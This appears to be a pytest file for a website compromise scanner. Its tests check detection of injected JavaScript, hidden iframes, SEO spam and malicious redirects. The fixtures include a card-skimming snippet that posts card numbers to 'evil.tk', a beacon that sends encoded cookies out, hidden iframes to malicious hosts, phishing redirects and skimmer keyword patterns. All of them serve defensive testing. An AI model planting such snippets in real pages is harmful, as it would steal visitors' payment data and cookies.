# WebHound — scanner/tests/test_compromise_engines.py
# Tests for Phase 6 compromise detection engines.

from __future__ import annotations

from datetime import datetime, timezone

import pytest

from webhound.core.extractor import PageArtifacts
from webhound.engines.compromise.hidden_iframes import HiddenIframesEngine
from webhound.engines.compromise.injected_js import InjectedJsEngine
from webhound.engines.compromise.seo_spam import SeoSpamEngine
from webhound.engines.compromise.suspicious_redirects import SuspiciousRedirectsEngine
from webhound.models.severity import Severity


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _artifacts(
    url: str = "https://example.com",
    inline_scripts: list[str] | None = None,
    external_script_urls: list[str] | None = None,
    all_links: list[str] | None = None,
    meta_tags: dict[str, str] | None = None,
    response_headers: dict[str, str] | None = None,
) -> PageArtifacts:
    return PageArtifacts(
        url=url,
        status_code=200,
        content_type="text/html",
        title=None,
        all_links=all_links or [],
        internal_links=[],
        external_links=[],
        scripts=[],
        inline_scripts=inline_scripts or [],
        external_script_urls=external_script_urls or [],
        forms=[],
        cookies=[],
        response_headers=response_headers or {},
        meta_tags=meta_tags or {},
        extracted_at=datetime.now(timezone.utc),
    )


# ---------------------------------------------------------------------------
# InjectedJsEngine
# ---------------------------------------------------------------------------

class TestInjectedJsEngine:
    def setup_method(self):
        self.engine = InjectedJsEngine()

    def test_no_scripts_returns_empty(self):
        art = _artifacts()
        assert self.engine.analyze(art) == []

    def test_payment_harvest_detected(self):
        script = (
            "var cc = document.querySelector('[name=card_number]').value; "
            "fetch('https://evil.tk/collect', {body: cc});"
        )
        art = _artifacts(inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert any(f.severity == Severity.CRITICAL for f in findings)
        titles = [f.title for f in findings]
        assert any("skimmer" in t.lower() or "payment" in t.lower() for t in titles)

    def test_payment_terms_alone_no_finding(self):
        script = "console.log('card_number field rendered');"
        art = _artifacts(inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert not any("payment" in f.title.lower() for f in findings)

    def test_send_terms_alone_no_payment_finding(self):
        script = "fetch('/api/data').then(r => r.json());"
        art = _artifacts(inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert not any("payment" in f.title.lower() for f in findings)

    def test_dynamic_script_injection_detected(self):
        script = "var s = document.createElement('script'); s.src = 'https://cdn.example.com/lib.js';"
        art = _artifacts(inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert any("dynamically creates a <script>" in f.title.lower() for f in findings)
        assert any(f.severity == Severity.MEDIUM for f in findings)

    def test_dynamic_inject_case_insensitive(self):
        script = "document.createElement('SCRIPT');"
        art = _artifacts(inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert any("dynamic" in f.title.lower() for f in findings)

    def test_beacon_exfil_new_image(self):
        script = "new Image().src = 'https://tracker.example.com/pixel?data=' + payload;"
        art = _artifacts(inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert any("beacon" in f.title.lower() or "exfiltration" in f.title.lower() for f in findings)
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_beacon_exfil_send_beacon(self):
        script = "navigator.sendBeacon('/collect', JSON.stringify(formData));"
        art = _artifacts(inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert any("beacon" in f.title.lower() for f in findings)

    def test_skimmer_keyword_magecart(self):
        script = "// magecart loader v2"
        art = _artifacts(inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert any("skimmer" in f.title.lower() or "keyword" in f.title.lower() for f in findings)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_skimmer_keyword_formjacking(self):
        script = "var formjacking = true;"
        art = _artifacts(inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_external_script_risky_tld(self):
        art = _artifacts(external_script_urls=["https://cdn.evil.tk/script.js"])
        findings = self.engine.analyze(art)
        assert any("abuse-prone tld" in f.title.lower() for f in findings)
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_external_script_safe_domain_no_finding(self):
        art = _artifacts(external_script_urls=["https://cdn.jsdelivr.net/npm/jquery.min.js"])
        findings = self.engine.analyze(art)
        assert not any("abuse-prone tld" in f.title.lower() for f in findings)

    def test_multiple_scripts_multiple_findings(self):
        scripts = [
            "var s = document.createElement('script');",
            "new Image().src = 'https://x.example.com/?' + btoa(document.cookie);",
        ]
        art = _artifacts(inline_scripts=scripts)
        findings = self.engine.analyze(art)
        assert len(findings) >= 2

    def test_engine_name(self):
        assert self.engine.NAME == "injected_js"


# ---------------------------------------------------------------------------
# HiddenIframesEngine
# ---------------------------------------------------------------------------

class TestHiddenIframesEngine:
    def setup_method(self):
        self.engine = HiddenIframesEngine()

    def test_no_html_body_returns_empty(self):
        art = _artifacts()
        assert self.engine.analyze(art) == []

    def test_no_iframes_returns_empty(self):
        art = _artifacts()
        assert self.engine.analyze(art, html_body="<html><body><p>Hello</p></body></html>") == []

    def test_visible_iframe_no_finding(self):
        html = '<html><body><iframe src="https://youtube.com/embed/abc" width="560" height="315"></iframe></body></html>'
        art = _artifacts()
        findings = self.engine.analyze(art, html_body=html)
        assert findings == []

    def test_hidden_display_none_critical_risky_tld(self):
        html = '<html><body><iframe style="display:none" src="https://evil.tk/payload"></iframe></body></html>'
        art = _artifacts()
        findings = self.engine.analyze(art, html_body=html)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_hidden_visibility_hidden_critical_risky_tld(self):
        html = '<html><body><iframe style="visibility:hidden" src="https://malware.xyz/drive-by"></iframe></body></html>'
        art = _artifacts()
        findings = self.engine.analyze(art, html_body=html)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_hidden_zero_width_unknown_src_high(self):
        html = '<html><body><iframe width="1" height="1" src="https://unknown.example.org/track"></iframe></body></html>'
        art = _artifacts()
        findings = self.engine.analyze(art, html_body=html)
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_hidden_offscreen_no_src_high(self):
        html = '<html><body><iframe style="top:-1000px;left:-1000px;position:absolute"></iframe></body></html>'
        art = _artifacts()
        findings = self.engine.analyze(art, html_body=html)
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_hidden_trusted_domain_low(self):
        # A hidden iframe from a known platform (youtube) is LOW — less
        # suspicious than one pointing at an unknown/suspicious host.
        html = '<html><body><iframe style="display:none" src="https://youtube.com/embed/abc"></iframe></body></html>'
        art = _artifacts()
        findings = self.engine.analyze(art, html_body=html)
        assert any(f.severity == Severity.LOW for f in findings)

    def test_hidden_data_uri_critical(self):
        html = '<html><body><iframe style="display:none" src="data:text/html,<script>alert(1)</script>"></iframe></body></html>'
        art = _artifacts()
        findings = self.engine.analyze(art, html_body=html)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_opacity_zero_hidden(self):
        html = '<html><body><iframe style="opacity:0" src="https://badactor.club/track"></iframe></body></html>'
        art = _artifacts()
        findings = self.engine.analyze(art, html_body=html)
        assert len(findings) >= 1

    def test_engine_name(self):
        assert self.engine.NAME == "hidden_iframes"


# ---------------------------------------------------------------------------
# SeoSpamEngine
# ---------------------------------------------------------------------------

class TestSeoSpamEngine:
    def setup_method(self):
        self.engine = SeoSpamEngine()

    def test_clean_page_no_findings(self):
        art = _artifacts(meta_tags={"title": "Welcome to My Site", "description": "A clean website."})
        assert self.engine.analyze(art) == []

    def test_pharma_spam_in_title(self):
        art = _artifacts(meta_tags={"title": "Buy cheap viagra pills online"})
        findings = self.engine.analyze(art)
        assert any("pharma" in f.title.lower() for f in findings)
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_casino_spam_in_description(self):
        art = _artifacts(meta_tags={"description": "Best online casino with free slots!"})
        findings = self.engine.analyze(art)
        assert any("casino" in f.title.lower() for f in findings)

    def test_adult_spam_in_meta(self):
        art = _artifacts(meta_tags={"title": "Adult video chat live"})
        findings = self.engine.analyze(art)
        assert any("adult" in f.title.lower() for f in findings)

    def test_loan_spam_in_meta(self):
        art = _artifacts(meta_tags={"description": "Payday loans no credit check"})
        findings = self.engine.analyze(art)
        assert any("loan" in f.title.lower() for f in findings)

    def test_excessive_external_links(self):
        page_url = "https://example.com"
        external = [f"https://spam-site-{i}.com/link" for i in range(50)]
        art = _artifacts(url=page_url, all_links=external)
        findings = self.engine.analyze(art)
        assert any("excessive external links" in f.title.lower() for f in findings)
        assert any(f.severity == Severity.MEDIUM for f in findings)

    def test_below_link_threshold_no_finding(self):
        page_url = "https://example.com"
        external = [f"https://site-{i}.com/link" for i in range(10)]
        art = _artifacts(url=page_url, all_links=external)
        findings = self.engine.analyze(art)
        assert not any("excessive external links" in f.title.lower() for f in findings)

    def test_internal_links_not_counted(self):
        page_url = "https://example.com"
        internal = [f"https://example.com/page-{i}" for i in range(60)]
        art = _artifacts(url=page_url, all_links=internal)
        findings = self.engine.analyze(art)
        assert not any("excessive external links" in f.title.lower() for f in findings)

    def test_hidden_spam_block_detected(self):
        html = (
            '<html><body>'
            '<div style="display:none">Buy cheap viagra pills online now!</div>'
            '</body></html>'
        )
        art = _artifacts()
        findings = self.engine.analyze(art, html_body=html)
        assert any("hidden spam block" in f.title.lower() for f in findings)
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_hidden_spam_link_detected(self):
        html = (
            '<html><body>'
            '<a href="https://casino-spam.com" style="display:none">online casino free slots</a>'
            '</body></html>'
        )
        art = _artifacts()
        findings = self.engine.analyze(art, html_body=html)
        assert any("hidden spam link" in f.title.lower() for f in findings)

    def test_visible_spam_link_no_hidden_finding(self):
        html = (
            '<html><body>'
            '<a href="https://example.com">online casino</a>'
            '</body></html>'
        )
        art = _artifacts()
        findings = self.engine.analyze(art, html_body=html)
        assert not any("hidden spam link" in f.title.lower() for f in findings)

    def test_no_html_body_skips_dom_checks(self):
        art = _artifacts()
        findings = self.engine.analyze(art)
        assert not any("hidden" in f.title.lower() for f in findings)

    def test_engine_name(self):
        assert self.engine.NAME == "seo_spam"


# ---------------------------------------------------------------------------
# SuspiciousRedirectsEngine
# ---------------------------------------------------------------------------

class TestSuspiciousRedirectsEngine:
    def setup_method(self):
        self.engine = SuspiciousRedirectsEngine()

    def test_no_redirects_no_findings(self):
        art = _artifacts()
        assert self.engine.analyze(art) == []

    def test_meta_refresh_external_high(self):
        art = _artifacts(meta_tags={"refresh": "0; url=https://malicious.example.org/landing"})
        findings = self.engine.analyze(art)
        assert any("meta refresh" in f.title.lower() for f in findings)
        assert any(f.severity == Severity.HIGH for f in findings)

    def test_meta_refresh_same_domain_no_finding(self):
        art = _artifacts(
            url="https://example.com",
            meta_tags={"refresh": "5; url=https://example.com/new-page"},
        )
        findings = self.engine.analyze(art)
        assert not any("meta refresh" in f.title.lower() for f in findings)

    def test_meta_refresh_shortener_medium(self):
        art = _artifacts(meta_tags={"refresh": "0; url=https://bit.ly/abc123"})
        findings = self.engine.analyze(art)
        assert any("url shortener" in f.title.lower() for f in findings)
        assert any(f.severity == Severity.MEDIUM for f in findings)

    def test_meta_refresh_no_url_no_finding(self):
        art = _artifacts(meta_tags={"refresh": "30"})
        findings = self.engine.analyze(art)
        assert findings == []

    def test_meta_refresh_relative_url_no_finding(self):
        art = _artifacts(meta_tags={"refresh": "5; url=/home"})
        findings = self.engine.analyze(art)
        assert not any("meta refresh" in f.title.lower() for f in findings)

    def test_js_redirect_location_href(self):
        script = "window.location.href = 'https://attacker.example.com/phish';"
        art = _artifacts(url="https://example.com", inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert any("redirects to external domain" in f.title.lower() for f in findings)
        assert any(f.severity == Severity.MEDIUM for f in findings)

    def test_js_redirect_location_replace(self):
        script = "location.replace('https://other.example.net/page');"
        art = _artifacts(url="https://example.com", inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert any("redirects to external domain" in f.title.lower() for f in findings)

    def test_js_redirect_location_assign(self):
        script = "location.assign('https://another.domain.org/');"
        art = _artifacts(url="https://example.com", inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert any("redirects to external domain" in f.title.lower() for f in findings)

    def test_js_redirect_same_domain_no_finding(self):
        script = "window.location.href = 'https://example.com/other-page';"
        art = _artifacts(url="https://example.com", inline_scripts=[script])
        findings = self.engine.analyze(art)
        assert not any("redirects to external domain" in f.title.lower() for f in findings)

    def test_open_redirect_param_url(self):
        art = _artifacts(url="https://example.com/login?redirect=https://phishing.example.net/steal")
        findings = self.engine.analyze(art)
        assert any("open-redirect parameter" in f.title.lower() for f in findings)
        assert any(f.severity == Severity.MEDIUM for f in findings)

    def test_open_redirect_param_next(self):
        art = _artifacts(url="https://example.com/page?next=https://malicious.org/")
        findings = self.engine.analyze(art)
        assert any("open-redirect parameter" in f.title.lower() for f in findings)

    def test_open_redirect_relative_value_no_finding(self):
        art = _artifacts(url="https://example.com/page?redirect=/dashboard")
        findings = self.engine.analyze(art)
        assert not any("open-redirect parameter" in f.title.lower() for f in findings)

    def test_open_redirect_same_domain_no_finding(self):
        art = _artifacts(url="https://example.com/page?return=https://example.com/home")
        findings = self.engine.analyze(art)
        assert not any("open-redirect parameter" in f.title.lower() for f in findings)

    def test_unknown_param_no_finding(self):
        art = _artifacts(url="https://example.com/page?foo=https://evil.com/")
        findings = self.engine.analyze(art)
        assert not any("open-redirect parameter" in f.title.lower() for f in findings)

    def test_engine_name(self):
        assert self.engine.NAME == "suspicious_redirects"
